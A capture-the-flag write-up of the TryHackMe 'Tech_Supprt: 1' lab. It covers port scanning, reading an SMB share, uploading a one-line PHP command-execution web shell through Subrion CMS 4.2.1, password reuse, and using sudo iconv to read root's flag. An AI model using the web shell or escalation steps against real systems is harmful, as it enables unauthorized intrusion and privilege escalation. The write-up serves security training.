---
title: 'THM Tech_Supprt: 1 Writeup'
date: 2024-03-30 17:34 -0400
categories: [Writeups, TryHackMe]
tags: [tech support, ctf]
---
# Intro
This box askes us to find a root flag, not much else in regards to direction or hints.

Let's start with
## Enumeration
```terminal
rustscan -a 10.10.40.22
```
*I like using rustscan initally as it is fast and works pretty well. We can run an nmap scan later to confirm services and look at all ports if we need to.*
```terminal
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
```
Let's use nmap to get more information
```terminal
nmap -sV -sC -A -O -vv -p 22,80,139,445 10.10.40.22 
```
```terminal
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:1F:B9:B4:2A:43 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.13 (99%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 5.1 (92%), Linux 3.10 (92%), Linux 3.12 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.60%E=4%D=3/30%OT=22%CT=%CU=43695%PV=Y%DS=1%DC=D%G=N%M=021FB9%TM=66088634%P=x86_64-pc-linux-gnu)
SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)
SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.006 days (since Sat Mar 30 21:28:39 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48060/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58983/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11738/udp): CLEAN (Timeout)
|   Check 4 (port 21073/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2024-03-31T03:07:52+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-30 21:37:52
|_  start_date: 1600-12-31 23:58:45
```
Looks like SMB might be able to give us some information. 
We can use SMBMap to enumerate if it is allowed without credentials.
```terminal
smbmap.py -H 10.10.40.22
```
```terminal
Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	websvr                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (TechSupport server (Samba, Ubuntu))
```
It looks like there is a share we are able to access, lets look into it.
```terminal
smbmap.py -H 10.10.40.22 -s webserv -r 
```
```terminal
Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	websvr                                            	READ ONLY	
	.\websvr\\*
	dr--r--r--                0 Sat May 29 08:17:38 2021	.
	dr--r--r--                0 Sat May 29 08:03:47 2021	..
	fr--r--r--              273 Sat May 29 08:17:38 2021	enter.txt
	IPC$                                              	NO ACCESS	IPC Service (TechSupport server (Samba, Ubuntu))
```
Let's try and download that file
```terminal
smbmap.py -H 10.10.40.22 -s webserv -r --download websvr/enter.txt
```
We find admin Subrion credentials which are "cooked with a magical formula", not quite base64...

it also mentions that the /subrion site is not functioning, and we must edit it through the panel
![website-screenshot](assets/img/writeupscreenshots/techsupport-1.png)
We can use our credentials here, at the same time we note the version, 4.2.1, let us search it is vulnerable to any exploits.
```terminal
searchsploit 'Subrion 4.2.1'
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS        | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload     | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forger | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting      | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripti | php/webapps/51110.txt
---------------------------------------------- ---------------------------------
```

Looks like there is an arbitrary file upload exploit available, looking through the exploit, it authenticates to the panel, uploads a php script which will allow us pass it commands as a parameter and then returns the url. Lets do this manually instead.

First step is to create a reverse shell
```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>

```
{: file="shell.phar" }
Let's upload it to the site and get the path.
![website-screenshot](assets/img/writeupscreenshots/techsupport-2.png)
![website-screenshot](assets/img/writeupscreenshots/techsupport-3.png)

## First user
We are now able to execute code on the machine, lets get a reverse shell instead. I used the PHP PentestMonkey shell and a netcat listener.

Now that we have a connection, lets upgrade our shell so we don't run into any silly issues.

`Ctrl+Z`
```terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```terminal
stty raw -echo; fg

```
```terminal
export TERM=xterm
```
We know that there is a wordpress site on here, along with credentials most likely. Let's see if the wp-config.php page is visible.
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'REDACTED' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
## Second user
We are able to see the username and password used for mysql, let's see if they reused it for their machine password.
```terminal
www-data@TechSupport:/var/www/html/wordpress$ su scamsite
Password: 
scamsite@TechSupport:/var/www/html/wordpress$ 
```
That works! One step closer. Let's work on getting to that root account.
## Privilege Escalation
Let's list our sudo privileges for this user with:
```terminal
sudo -l
```
```terminal
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
We can run this command as root, let's see if GTFObins has an exploit for it.
![website-screenshot](assets/img/writeupscreenshots/techsupport-4.png)
Looks like they do!

We can craft this command to read the root flag
```terminal
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```
That is it for this box, thanks for following along!
